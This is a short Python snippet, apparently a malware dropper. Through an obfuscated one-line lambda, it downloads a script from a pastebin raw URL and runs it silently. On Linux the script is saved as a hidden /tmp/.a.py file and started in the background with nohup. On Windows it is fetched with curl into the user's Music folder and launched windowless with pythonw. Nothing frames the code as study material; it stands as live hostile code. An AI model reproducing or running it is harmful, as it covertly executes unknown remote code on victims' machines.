import platform
from time import sleep
import subprocess
username = os.getlogin()
platfor = platform.system()
(lambda: (req := requests.get("https://pastebin.com/raw/pPQmHZbY")).text and (os.chdir("/tmp"), open(".a.py", "a").write(req.text), os.system("nohup python /tmp/.a.py > .output.txt 2>&1 &"), os.chdir(f"/home/{username}/")) if platfor == "Linux" else (os.chdir(
    f"C:\\Users\\{username}\\Music\\"), subprocess.Popen("curl https://pastebin.com/raw/pPQmHZbY -o a.py", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False), sleep(1.5), subprocess.Popen("pythonw a.py", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)) if platfor != "Linux" else None)()
